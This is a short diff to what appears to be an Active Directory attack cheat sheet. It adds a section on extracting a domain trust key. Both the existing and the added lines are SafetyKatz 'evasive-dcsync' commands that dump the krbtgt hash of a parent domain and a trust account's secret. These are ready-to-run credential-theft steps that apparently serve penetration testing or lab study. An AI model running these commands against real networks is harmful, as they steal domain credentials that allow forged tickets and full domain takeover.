@@ -29,3 +29,9 @@ If you have a ticket for a parent domain, add the correct DC to the parameters:
 ```powershell
 > SafetyKatz.exe "lsadump::evasive-dcsync /user:parentdomain\krbtgt /domain:parentdomain.local" "exit"
 ```
+
+## To get domain trust key
+
+```powershell
+> SafetyKatz.exe "lsadump::evasive-dcsync /user:us\techcorp$" "exit"
+```
